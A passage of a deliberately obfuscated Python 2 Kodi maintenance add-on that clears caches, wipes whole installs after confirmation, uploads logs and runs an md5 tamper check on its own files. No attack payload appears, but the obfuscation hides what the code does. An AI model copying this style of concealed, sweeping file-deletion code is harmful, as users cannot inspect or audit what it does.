  if 9 - 9: i11iIiiIii / iIii1I11I1II1 - I1ii11iIi11i * I1ii11iIi11i
  if 99 - 99: OooO00OOoO00
 if 'prof' in video :
  try :
   oOOOOOOooO = open ( oo0OooOOo0 , mode = 'w+' )
   oOOOOOOooO . write ( Iiii1iii1i )
   oOOOOOOooO . close ( )
  except :
   print "### Failed to write existing profile info back into profiles.xml"
   if 19 - 19: OooO00OOoO00 . iIii1I11I1II1 + o0oOOoo
   if 35 - 35: II111iiii + OOOOOOoo0O / I1ii11iIi11i * I1IiiI . OooO00OOoO00
 if video == 'library' or video == 'libprofile' or video == 'updatelibprofile' or video == 'updatelibrary' :
  extract . all ( OooO00 , iIi1ii1I1 , Ooo )
  if 97 - 97: I1IiiI / o0oOOo0O0Ooo
  if 13 - 13: I1ii11iIi11i
  if Iii1I1 != 1 :
   shutil . rmtree ( ooOOO00Ooo )
 try :
  Ooo . close ( )
 except :
  pass
  if 72 - 72: Oo0Ooo + oOO00 / OO000 * Oo0Ooo
  if 41 - 41: Oo - OoOoOO00 . I1IiiI + i11iIiiIii + OoO0O00 * OOOOOOoo0O
 if os . path . exists ( II1I ) :
  OooOoOO0OO ( description )
  if 85 - 85: OoO0O00 + II111iiii
  try :
   os . remove ( II1I )
   if 87 - 87: OoO0O00
  except :
   print "###' Failed to remove: " + II1I
   if 93 - 93: OoooooooOO
  try :
   shutil . rmtree ( ooOOoooooo )
   if 80 - 80: o0oOOo0O0Ooo
  except :
   print "###' Failed to remove: " + ooOOoooooo
   if 3 - 3: i11iIiiIii / Oo + ooOo
 else :
  print "### Community Builds - using an old build"
  if 10 - 10: OoO0O00 . OoO0O00 + O0
  if 13 - 13: i1IIi . I1IiiI
 if I1I1i11i1 != o00oO00O0 :
  print "### GUI SIZE DIFFERENT ATTEMPTING MERGE ###"
  i11Ii111Ii = os . path . join ( O0o0Oo , 'newbuild' )
  if 73 - 73: i1Ii11i1i
  if not os . path . exists ( i11Ii111Ii ) :
   os . makedirs ( i11Ii111Ii )
   if 8 - 8: I1ii11iIi11i - o0oOOoo + OOOOOOoo0O * OoO0O00
  os . makedirs ( O000OOo00oo )
  time . sleep ( 1 )
  IiiII ( guisettingslink , video )
  time . sleep ( 1 )
  OOo00O0O ( )
  OO0o . ok ( "Force Close Required" , "If you\'re seeing this message it means the force close was unsuccessful. Please close XBMC/Kodi via your operating system or pull the power." )
  if 22 - 22: I1ii11iIi11i * OoooooooOO
 if I1I1i11i1 == o00oO00O0 :
  OO0o . ok ( 'Successfully Updated' , 'Congratulations the following build:[COLOR=dodgerblue]' , description , '[/COLOR]has been successfully updated!' )
  if 33 - 33: Oo / o0oOOo0O0Ooo + Oo . i11iIiiIii
  if 19 - 19: OoOoOO00 % OoOoOO00
def OoOO ( ) :
 if o0O . getSetting ( 'email' ) == '' :
  OO0o = xbmcgui . Dialog ( )
  OO0o . ok ( "No Email Address Set" , "A new window will Now open for you to enter your Email address. The logfile will be sent here" )
  o0O . openSettings ( )
 xbmc . executebuiltin ( 'XBMC.RunScript(special://home/addons/' + I1IiI + '/uploadLog.py)' )
 if 17 - 17: i1IIi + OOOOOOoo0O / ooOo % OoOoOO00
 if 79 - 79: I1ii11iIi11i
def i1II1 ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 xbmcgui . Dialog ( ) . ok ( 'Force Refresh Started Successfully' , 'Depending on the speed of your device it could take a few minutes for the update to take effect.' )
 return
 if 87 - 87: oOO00 . i1Ii11i1i
 if 33 - 33: i1Ii11i1i % OoOoOO00 * I1ii11iIi11i - OoooooooOO / OoOoOO00
def I11ooOo ( ) :
 oo0OoooOO = 1
 try :
  o0OO0o0o00o ( 'http://google.com' )
 except :
  try :
   o0OO0o0o00o ( 'http://google.com' )
  except :
   try :
    o0OO0o0o00o ( 'http://google.com' )
   except :
    try :
     o0OO0o0o00o ( 'http://google.cn' )
    except :
     try :
      o0OO0o0o00o ( 'http://google.cn' )
     except :
      OO0o . ok ( "NO INTERNET CONNECTION" , 'It looks like this device isn\'t connected to the internet. Only some of the maintenance options will work until you fix the connectivity problem.' )
      Categories ( '' , '' , '' , '[COLOR=orange]NO INTERNET CONNECTION[/COLOR]' )
      oo0OoooOO = 0
 if oo0OoooOO == 1 :
  O0i11 ( )
  if 13 - 13: OoO0O00 * Oo + ooOo
  if 21 - 21: i11iIiiIii . OO000 % i1IIi * OO000 . ooOo + OO000
def O0i11 ( ) :
 Ii1I1I = 'None'
 Ii1I1Iiii = '0'
 if 92 - 92: i1IIi + OoO0O00 * OooO00OOoO00
 iiIi1I1i1 = open ( o00OO00OoO , mode = 'r' )
 IiiI = iiIi1I1i1 . read ( )
 iiIi1I1i1 . close ( )
 if 70 - 70: Oo0Ooo
 O0II = re . compile ( 'date="(.+?)"' ) . findall ( IiiI )
 IIiII1ii1i11I = O0II [ 0 ] if ( len ( O0II ) > 0 ) else ''
 iIiiI111I11 = re . compile ( 'version="(.+?)"' ) . findall ( IiiI )
 iiIiII1 = iIiiI111I11 [ 0 ] if ( len ( iIiiI111I11 ) > 0 ) else ''
 if 76 - 76: OoO0O00 + i1Ii11i1i + OoO0O00 * OoooooooOO
 i1iI1IIi1I = open ( O0Oo000ooO00 , mode = 'r' )
 oo00i1i11I1I1 = i1iI1IIi1I . read ( )
 i1iI1IIi1I . close ( )
 if 85 - 85: OOOOOOoo0O + Oo
 Ii1iIi111i1i1 = re . compile ( 'id="(.+?)"' ) . findall ( oo00i1i11I1I1 )
 OoO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( oo00i1i11I1I1 )
 Ii1I1Iiii = Ii1iIi111i1i1 [ 0 ] if ( len ( Ii1iIi111i1i1 ) > 0 ) else 'None'
 Ii1I1I = OoO0Ooo [ 0 ] if ( len ( OoO0Ooo ) > 0 ) else ''
 if 36 - 36: OoO0O00 % II111iiii * O0 + II111iiii - ooOo - i1IIi
 i11Ii1IIi ( Ii1I1I , iiIiII1 , Ii1I1Iiii , '' )
 if 53 - 53: OO000 - Oo
def o0IiIiI111IIII1 ( ) :
 O0OoO0OOOo = os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' ) ) )
 if 32 - 32: OOOOOOoo0O - OOOOOOoo0O / OoO0O00 % iIii1I11I1II1 / I1ii11iIi11i / oOO00
 iI1III1ii1 = [
 ( O0OoO0OOOo ) ,
 ( O0O ) ,
 ( os . path . join ( O0o0Oo , 'cache' ) ) ,
 ( os . path . join ( O0o0Oo , 'temp' ) ) ,
 ( os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' ) ) ,
 ( os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' ) ) ,
 ( os . path . join ( O0O , 'script.module.simple.downloader' ) ) ,
 ( os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' , 'script.module.simple.downloader' ) ) ) ) ,
 ( os . path . join ( O0O , 'plugin.video.itv' , 'Images' ) ) ,
 ( os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' , 'plugin.video.itv' , 'Images' ) ) ) ) ]
 if 23 - 23: Oo
 for iiiiIii11i1 in iI1III1ii1 :
  if os . path . exists ( iiiiIii11i1 ) and iiiiIii11i1 != O0O and iiiiIii11i1 != O0OoO0OOOo :
   for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( iiiiIii11i1 ) :
    oOOO = 0
    oOOO += len ( III1I11i1iIi )
    if oOOO > 0 :
     for oooO in III1I11i1iIi :
      try :
       os . unlink ( os . path . join ( Oo0 , oooO ) )
      except :
       pass
     for ooOOoOo in o0IiiiI111I :
      try :
       shutil . rmtree ( os . path . join ( Oo0 , ooOOoOo ) )
       print "### Successfully cleared " + str ( oOOO ) + " files from " + os . path . join ( iiiiIii11i1 , ooOOoOo )
      except :
       print "### Failed to wipe cache in: " + os . path . join ( iiiiIii11i1 , ooOOoOo )
  else :
   for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( iiiiIii11i1 ) :
    for ooOOoOo in o0IiiiI111I :
     if 'Cache' in ooOOoOo or 'cache' in ooOOoOo or 'CACHE' in ooOOoOo :
      try :
       shutil . rmtree ( os . path . join ( Oo0 , ooOOoOo ) )
       print "### Successfully wiped " + os . path . join ( iiiiIii11i1 , ooOOoOo )
      except :
       print "### Failed to wipe cache in: " + os . path . join ( iiiiIii11i1 , ooOOoOo )
       if 19 - 19: o0oOOoo % iIii1I11I1II1 * OoooooooOO
       if 60 - 60: i1Ii11i1i * OOOOOOoo0O / OoooooooOO * Oo0Ooo
 try :
  OO0OooOOoO00OO00 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
  OoOo = database . connect ( OO0OooOOoO00OO00 )
  oooo0oo = OoOo . cursor ( )
  oooo0oo . execute ( "DROP TABLE IF EXISTS rel_list" )
  oooo0oo . execute ( "VACUUM" )
  OoOo . commit ( )
  oooo0oo . execute ( "DROP TABLE IF EXISTS rel_lib" )
  oooo0oo . execute ( "VACUUM" )
  OoOo . commit ( )
 except :
  pass
  if 47 - 47: OOOOOOoo0O + o0oOOo0O0Ooo % iIii1I11I1II1 * OoOoOO00
  if 65 - 65: Oo . II111iiii * i11iIiiIii + Oo
def oOOo0OO0oo ( mode ) :
 if zip == '' :
  OO0o . ok ( 'Please set your backup location before proceeding' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' )
  o0O . openSettings ( sys . argv [ 0 ] )
  OOO0o0ooO0 = o0O . getSetting ( 'zip' )
  if OOO0o0ooO0 == '' :
   oOOo0OO0oo ( mode )
 i1i11iii11 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' ) )
 if not os . path . exists ( i1i11iii11 ) :
  os . makedirs ( i1i11iii11 )
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( "ABSOLUTELY CERTAIN?!!!" , 'Are you absolutely certain you want to wipe?' , '' , 'All addons and settings will be completely wiped!' , yeslabel = 'Yes' , nolabel = 'No' )
 if 16 - 16: OOOOOOoo0O . oOO00 . OoO0O00
 if iIiI1 == 1 :
  if O0ii1ii1ii != "skin.confluence" :
   OO0o . ok ( 'Default Confluence Skin Required' , 'Please switch to the default Confluence skin before performing a wipe.' )
   xbmc . executebuiltin ( "ActivateWindow(appearancesettings,return)" )
   return
  else :
   if 39 - 39: O0
   iIiI1 = xbmcgui . Dialog ( ) . yesno ( "VERY IMPORTANT" , 'This will completely wipe your install.' , 'Would you like to create a backup before proceeding?' , '' , yeslabel = 'No' , nolabel = 'Yes' )
   if iIiI1 == 0 :
    if not os . path . exists ( i1i11iii11 ) :
     os . makedirs ( i1i11iii11 )
    OO000OOo = oOo0O000Ooo0 ( heading = "Enter a name for this backup" )
    if ( not OO000OOo ) : return False , 0
    O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
    OooO00 = xbmc . translatePath ( os . path . join ( i1i11iii11 , O0Oo0O00o0oo0OO + '.zip' ) )
    o0O00OoOOo = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
    iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
    I1i11II11i1iI = "Creating full backup of existing build"
    iI1 = "Archiving..."
    I1I1i1i = ""
    OOo0O = "Please Wait"
    IIiIiII ( O0o0Oo , OooO00 , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
   I1IiI11i1I ( IIII )
   Ii1I11II1IiI ( )
   iiIiiII1IIi1I ( )
   oo00o0Oo0O0 ( )
   OOo00 ( IIII )
   if os . path . exists ( o00OO00OoO ) :
    os . remove ( o00OO00OoO )
   if os . path . exists ( OOOO0OOoO0O0 ) :
    os . remove ( OOOO0OOoO0O0 )
   if os . path . exists ( O0Oo000ooO00 ) :
    os . remove ( O0Oo000ooO00 )
  if mode != 'CB' :
   OOo00O0O ( )
  try :
   os . remove ( o00OO00OoO )
  except :
   print "### Failed to remove startup.xml"
  try :
   os . remove ( O0Oo000ooO00 )
  except :
   print "### Failed to remove id.xml"
 else :
  return
  if 42 - 42: OoooooooOO / oOO00 * II111iiii
  if 77 - 77: II111iiii + OOOOOOoo0O . o0oOOo0O0Ooo / i1Ii11i1i
def I1IiI11i1I ( excludefiles ) :
 Ooo . create ( "Wiping Existing Content" , '' , 'Please wait...' , '' )
 for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( O0o0Oo , topdown = True ) :
  o0IiiiI111I [ : ] = [ ooOOoOo for ooOOoOo in o0IiiiI111I if ooOOoOo not in IIII ]
  for oOo00O0oo00o0 in III1I11i1iIi :
   try :
    Ooo . update ( 0 , "Removing [COLOR=yellow]" + oOo00O0oo00o0 + '[/COLOR]' , '' , 'Please wait...' )
    os . unlink ( os . path . join ( Oo0 , oOo00O0oo00o0 ) )
    os . remove ( os . path . join ( Oo0 , oOo00O0oo00o0 ) )
    os . rmdir ( os . path . join ( Oo0 , oOo00O0oo00o0 ) )
   except :
    print "Failed to remove file: " + oOo00O0oo00o0
    if 100 - 100: OO000
    if 84 - 84: OooO00OOoO00 * o0oOOoo + i11iIiiIii + OOOOOOoo0O - II111iiii
def Ii1I11II1IiI ( ) :
 Oo0ooO = [ oOo00O0oo00o0 for oOo00O0oo00o0 in os . listdir ( Oo00OOOOO ) if os . path . isdir ( os . path . join ( Oo00OOOOO , oOo00O0oo00o0 ) ) ]
 try :
  for oOo00O0oo00o0 in Oo0ooO :
   try :
    if oOo00O0oo00o0 not in IIII :
     Ooo . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + oOo00O0oo00o0 + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( Oo00OOOOO , oOo00O0oo00o0 ) )
   except :
    print "Failed to remove: " + oOo00O0oo00o0
 except :
  pass
  if 54 - 54: ooOo
  if 88 - 88: Oo / OO000 . OOOOOOoo0O - OoOoOO00 + OOOOOOoo0O
 for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( Oo00OOOOO , topdown = True ) :
  o0IiiiI111I [ : ] = [ ooOOoOo for ooOOoOo in o0IiiiI111I if ooOOoOo not in IIII ]
  for oOo00O0oo00o0 in III1I11i1iIi :
   try :
    Ooo . update ( 0 , "Removing [COLOR=yellow]" + oOo00O0oo00o0 + '[/COLOR]' , '' , 'Please wait...' )
    os . unlink ( os . path . join ( Oo0 , oOo00O0oo00o0 ) )
    os . remove ( os . path . join ( Oo0 , oOo00O0oo00o0 ) )
   except :
    print "Failed to remove file: " + oOo00O0oo00o0
    if 83 - 83: OOOOOOoo0O + OoooooooOO + i1IIi / Oo0Ooo
    if 28 - 28: I1IiiI
def iiIiiII1IIi1I ( ) :
 iI1iI1IIIii = [ oOo00O0oo00o0 for oOo00O0oo00o0 in os . listdir ( ooooooO0oo ) if os . path . isdir ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) ) ]
 try :
  for oOo00O0oo00o0 in iI1iI1IIIii :
   try :
    if oo00 == 'true' :
     if oOo00O0oo00o0 not in IIII and not 'repo' in oOo00O0oo00o0 :
      Ooo . update ( 0 , "Removing Add-on: [COLOR=yellow]" + oOo00O0oo00o0 + ' [/COLOR]' , '' , 'Please wait...' )
      shutil . rmtree ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) )
    else :
     if oOo00O0oo00o0 not in IIII :
      Ooo . update ( 0 , "Removing Add-on: [COLOR=yellow]" + oOo00O0oo00o0 + ' [/COLOR]' , '' , 'Please wait...' )
      shutil . rmtree ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) )
   except :
    print "Failed to remove: " + oOo00O0oo00o0
 except :
  pass
  if 2 - 2: OO000 % Oo . OoO0O00
  if 17 - 17: Oo / i11iIiiIii % O0 / i1Ii11i1i
def oo00o0Oo0O0 ( ) :
 Oo0ooi1I = [ oOo00O0oo00o0 for oOo00O0oo00o0 in os . listdir ( O0O ) if os . path . isdir ( os . path . join ( O0O , oOo00O0oo00o0 ) ) ]
 try :
  for oOo00O0oo00o0 in Oo0ooi1I :
   try :
    if oOo00O0oo00o0 not in IIII :
     Ooo . update ( 0 , "Removing Add-on Data: [COLOR=yellow]" + oOo00O0oo00o0 + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( O0O , oOo00O0oo00o0 ) )
   except :
    print "Failed to remove: " + oOo00O0oo00o0
 except :
  pass
  if 48 - 48: ooOo + iIii1I11I1II1 * o0oOOo0O0Ooo / OoO0O00
  if 27 - 27: OoooooooOO - o0oOOo0O0Ooo . OOOOOOoo0O % ooOo / Oo * OOOOOOoo0O
def OOo00 ( excludefiles ) :
 IIi = [ oOo00O0oo00o0 for oOo00O0oo00o0 in os . listdir ( O0o0Oo ) if os . path . isdir ( os . path . join ( O0o0Oo , oOo00O0oo00o0 ) ) ]
 try :
  for oOo00O0oo00o0 in IIi :
   try :
    if oOo00O0oo00o0 not in excludefiles :
     Ooo . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + oOo00O0oo00o0 + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( O0o0Oo , oOo00O0oo00o0 ) )
   except :
    print "Failed to remove: " + oOo00O0oo00o0
 except :
  pass
  if 98 - 98: Oo0Ooo % OooO00OOoO00 - OO000
  if 17 - 17: i1Ii11i1i + OOOOOOoo0O / OoO0O00
def oOOOoO00OOooOOOoO ( url ) :
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]1. Install[/COLOR]' , str ( url ) + '&tags=Install&XBMC=1' , 'grab_tutorials' , 'Install.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime]2. Settings[/COLOR]' , str ( url ) + '&tags=Settings' , 'grab_tutorials' , 'Settings.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange]3. Add-ons[/COLOR]' , str ( url ) , 'tutorial_addon_menu' , 'Addons.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Audio' , str ( url ) + '&tags=Audio' , 'grab_tutorials' , 'Audio.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Errors' , str ( url ) + '&tags=Errors' , 'grab_tutorials' , 'Errors.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Gaming' , str ( url ) + '&tags=Gaming' , 'grab_tutorials' , 'gaming_portal.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  LiveTV' , str ( url ) + '&tags=LiveTV' , 'grab_tutorials' , 'LiveTV.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Maintenance' , str ( url ) + '&tags=Maintenance' , 'grab_tutorials' , 'Maintenance.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Pictures' , str ( url ) + '&tags=Pictures' , 'grab_tutorials' , 'Pictures.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Profiles' , str ( url ) + '&tags=Profiles' , 'grab_tutorials' , 'Profiles.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Skins' , str ( url ) + '&tags=Skins' , 'grab_tutorials' , 'Skin.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Video' , str ( url ) + '&tags=Video' , 'grab_tutorials' , 'Video.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Weather' , str ( url ) + '&tags=Weather' , 'grab_tutorials' , 'Weather.png' , '' , '' , '' )
 if 60 - 60: OoO0O00
 if 16 - 16: OooO00OOoO00
def iII11i1 ( url ) :
 oOooOOOoOo = xbmc . getInfoLabel ( "System.BuildVersion" )
 iII1iii = float ( oOooOOOoOo [ : 4 ] )
 if iII1iii < 14 :
  o0O000OO0O0 = 'You are running XBMC'
 else :
  o0O000OO0O0 = 'You are running Kodi'
 OO0o = xbmcgui . Dialog ( )
 OO0o . ok ( o0O000OO0O0 , "Your version is: %s" % iII1iii )
 if 99 - 99: O0 % OoO0O00 % i1IIi / o0oOOo0O0Ooo
 if 99 - 99: ooOo - OoOoOO00 . o0oOOo0O0Ooo / O0 + O0 + I1ii11iIi11i
 if 37 - 37: ooOo % OOOOOOoo0O / II111iiii / OoO0O00 - oOO00 - o0oOOoo
 if 69 - 69: I1ii11iIi11i . OoooooooOO % i1Ii11i1i
 if 79 - 79: I1IiiI - oOO00 . OoooooooOO - I1ii11iIi11i
 if 79 - 79: Oo + o0oOOo0O0Ooo % OOOOOOoo0O . ooOo
 if 49 - 49: OO000 + i11iIiiIii * OoOoOO00 . OoOoOO00 . I1ii11iIi11i . Oo0Ooo
 if 61 - 61: OooO00OOoO00 / Oo
 if 85 - 85: OoOoOO00 - OooO00OOoO00 . OoOoOO00 . OoOoOO00
 if 62 - 62: oOO00 % OoooooooOO * OoO0O00 + OoO0O00 % OO000 % OOOOOOoo0O
 if 66 - 66: I1IiiI . Oo - OoO0O00 % Oo0Ooo * o0oOOo0O0Ooo - ooOo
 if 68 - 68: OooO00OOoO00 - i11iIiiIii / o0oOOo0O0Ooo + o0oOOoo / I1IiiI
 if 31 - 31: i1Ii11i1i . OoooooooOO . i1IIi
 if 65 - 65: OoO0O00 . o0oOOoo
 if 12 - 12: i1Ii11i1i + O0 - ooOo . oOO00
 if 46 - 46: oOO00 . o0oOOoo / OOOOOOoo0O
 if 63 - 63: II111iiii - I1ii11iIi11i * II111iiii
 if 92 - 92: OoO0O00 % o0oOOoo * O0 % iIii1I11I1II1 / i1IIi / OoOoOO00
 if 67 - 67: i1Ii11i1i + OooO00OOoO00 + i1Ii11i1i . Oo % o0oOOo0O0Ooo / o0oOOoo
 if 78 - 78: I1ii11iIi11i . O0
 if 56 - 56: ooOo - i1IIi * O0 / OooO00OOoO00 * I1IiiI . OooO00OOoO00
 if 54 - 54: i11iIiiIii % i1IIi + Oo0Ooo / OoOoOO00
o0oOoOooOOo = o0o0OOo0OOoO ( )
I1iii11 = None
O0000 = None
I111iIIII11iI = None
ii1i1II = None
IiII1i11III = None
Ii1iii11i1ii1 = None
IiIi11Iii = None
i1IOO00OOOO00oOO = None
o0o00oO0oo000 = None
OOoo = None
oooO00o0 = None
i11i1ii1I = None
ooO00 = None
O0o0ooO0oO0oO = None
iI1iII111ii1I = None
oOo00O0oo00o0 = None
OOO0o0OO = None
oOoOO = None
ooo0O = None
Ii1i1i1i1I1Ii = None
II1i111i11i1i = None
IIi1i1I11IIII = None
iIiiI11II11i = None
O0Oo0O00o0oo0OO = None
oOOo0oo0O = None
OOo0o = None
o0OoIiiiiiiI111i = None
iII1iii = None
OoiIIiIi1 = None
OooOoOOO00O = None
iII1 = None
IiIiIiiii = None
oOO0o = 'maintenance'
if 81 - 81: Oo0Ooo . iIii1I11I1II1 + I1ii11iIi11i / Oo0Ooo % i1Ii11i1i
try :
 I1iii11 = urllib . unquote_plus ( o0oOoOooOOo [ "addon_id" ] )
except :
 pass
try :
 o00OoO0o0 = urllib . unquote_plus ( o0oOoOooOOo [ "adult" ] )
except :
 pass
try :
 O0000 = urllib . unquote_plus ( o0oOoOooOOo [ "artpack" ] )
except :
 pass
try :
 I111iIIII11iI = urllib . unquote_plus ( o0oOoOooOOo [ "audioaddons" ] )
except :
 pass
try :
 ii1i1II = urllib . unquote_plus ( o0oOoOooOOo [ "author" ] )
except :
 pass
try :
 IiII1i11III = urllib . unquote_plus ( o0oOoOooOOo [ "buildname" ] )
except :
 pass
try :
 Ii1iii11i1ii1 = urllib . unquote_plus ( o0oOoOooOOo [ "data_path" ] )
except :
 pass
try :
 IiIi11Iii = urllib . unquote_plus ( o0oOoOooOOo [ "description" ] )
except :
 pass
try :
 i1IOO00OOOO00oOO = urllib . unquote_plus ( o0oOoOooOOo [ "email" ] )
except :
 pass
try :
 o0o00oO0oo000 = urllib . unquote_plus ( o0oOoOooOOo [ "fanart" ] )
except :
 pass
try :
 OOoo = urllib . unquote_plus ( o0oOoOooOOo [ "forum" ] )
except :
 pass
try :
 o0OOOoO0ooOOOo0 = urllib . unquote_plus ( o0oOoOooOOo [ "guisettingslink" ] )
except :
 pass
try :
 oooO00o0 = urllib . unquote_plus ( o0oOoOooOOo [ "iconimage" ] )
except :
 pass
try :
 i11i1ii1I = urllib . unquote_plus ( o0oOoOooOOo [ "link" ] )
except :
 pass
try :
 ooO00 = urllib . unquote_plus ( o0oOoOooOOo [ "local" ] )
except :
 pass
try :
 O0o0ooO0oO0oO = urllib . unquote_plus ( o0oOoOooOOo [ "messages" ] )
except :
 pass
try :
 iI1iII111ii1I = str ( o0oOoOooOOo [ "mode" ] )
except :
 pass
try :
 oOo00O0oo00o0 = urllib . unquote_plus ( o0oOoOooOOo [ "name" ] )
except :
 pass
try :
 i11I1iIii1i11 = urllib . unquote_plus ( o0oOoOooOOo [ "pictureaddons" ] )
except :
 pass
try :
 OOO0o0OO = urllib . unquote_plus ( o0oOoOooOOo [ "posts" ] )
except :
 pass
try :
 oOoOO = urllib . unquote_plus ( o0oOoOooOOo [ "programaddons" ] )
except :
 pass
try :
 ooo0O = urllib . unquote_plus ( o0oOoOooOOo [ "provider_name" ] )
except :
 pass
try :
 II1i111i11i1i = urllib . unquote_plus ( o0oOoOooOOo [ "repo_link" ] )
except :
 pass
try :
 Ii1i1i1i1I1Ii = urllib . unquote_plus ( o0oOoOooOOo [ "repo_id" ] )
except :
 pass
try :
 IIi1i1I11IIII = urllib . unquote_plus ( o0oOoOooOOo [ "skins" ] )
except :
 pass
try :
 iIiiI11II11i = urllib . unquote_plus ( o0oOoOooOOo [ "sources" ] )
except :
 pass
try :
 O0Oo0O00o0oo0OO = urllib . unquote_plus ( o0oOoOooOOo [ "title" ] )
except :
 pass
try :
 oOOo0oo0O = urllib . unquote_plus ( o0oOoOooOOo [ "updated" ] )
except :
 pass
try :
 OOo0o = urllib . unquote_plus ( o0oOoOooOOo [ "unread" ] )
except :
 pass
try :
 o0OoIiiiiiiI111i = urllib . unquote_plus ( o0oOoOooOOo [ "url" ] )
except :
 pass
try :
 iII1iii = urllib . unquote_plus ( o0oOoOooOOo [ "version" ] )
except :
 pass
try :
 OoiIIiIi1 = urllib . unquote_plus ( o0oOoOooOOo [ "video" ] )
except :
 pass
try :
 OooOoOOO00O = urllib . unquote_plus ( o0oOoOooOOo [ "videoaddons" ] )
except :
 pass
try :
 iII1 = urllib . unquote_plus ( o0oOoOooOOo [ "welcometext" ] )
except :
 pass
try :
 IiIiIiiii = urllib . unquote_plus ( o0oOoOooOOo [ "zip_link" ] )
except :
 pass
 if 39 - 39: I1ii11iIi11i + OoooooooOO . Oo0Ooo % oOO00
if not os . path . exists ( ooo00OOOooO ) :
 os . makedirs ( ooo00OOOooO )
 if 82 - 82: i1IIi . oOO00
if not os . path . exists ( I11i1 ) :
 os . makedirs ( I11i1 )
 if 80 - 80: o0oOOoo / I1IiiI % OooO00OOoO00 . i1Ii11i1i / o0oOOoo
if not os . path . exists ( o00OO00OoO ) :
 iiIi1I1i1 = open ( o00OO00OoO , mode = 'w+' )
 iiIi1I1i1 . write ( 'date="01011001"\nversion="0.0"' )
 iiIi1I1i1 . close ( )
 if 78 - 78: o0oOOo0O0Ooo / OoooooooOO + i1IIi * OoOoOO00 . i1IIi / II111iiii
if not os . path . exists ( O0Oo000ooO00 ) :
 iiIi1I1i1 = open ( O0Oo000ooO00 , mode = 'w+' )
 iiIi1I1i1 . write ( 'id="None"\nname="None"' )
 iiIi1I1i1 . close ( )
 if 37 - 37: O0 % II111iiii % OOOOOOoo0O
if not os . path . exists ( oO0 ) :
 iiIi1I1i1 = open ( oO0 , mode = 'w+' )
 iiIi1I1i1 . write ( 'line="1"' )
 iiIi1I1i1 . close ( )
 if 15 - 15: II111iiii
oOoo0ooo = binascii . unhexlify ( '6164646f6e2e786d6c' )
ii = xbmc . translatePath ( os . path . join ( ooooooO0oo , I1IiI , oOoo0ooo ) )
iii11Ii = open ( ii , mode = 'r' )
IiiI = file . read ( iii11Ii )
file . close ( iii11Ii )
OooooooOOO0o0 = re . compile ( '<ref>(.+?)</ref>' ) . findall ( IiiI )
i1ooOoO = OooooooOOO0o0 [ 0 ] if ( len ( OooooooOOO0o0 ) > 0 ) else ''
o0Oo0o0o0ooo = hashlib . md5 ( open ( iiI111I1iIiI , 'rb' ) . read ( ) ) . hexdigest ( )
if i1ooOoO != o0Oo0o0o0ooo :
 IiiIiIIi1 = open ( iiiiiIIii , mode = 'r' )
 IiiI = file . read ( IiiIiIIi1 )
 file . close ( IiiIiIIi1 )
 if 6 - 6: I1IiiI + i1Ii11i1i - i11iIiiIii * OOOOOOoo0O / OooO00OOoO00 / O0
 if 79 - 79: OoO0O00
 if 4 - 4: OooO00OOoO00 / I1ii11iIi11i
 if 2 - 2: oOO00 + OooO00OOoO00 / iIii1I11I1II1 . i11iIiiIii . i1IIi * o0oOOoo
if iI1iII111ii1I == None : I11ooOo ( )
elif iI1iII111ii1I == 'ASCII_Check' : OOOoo0ooOo00O ( )
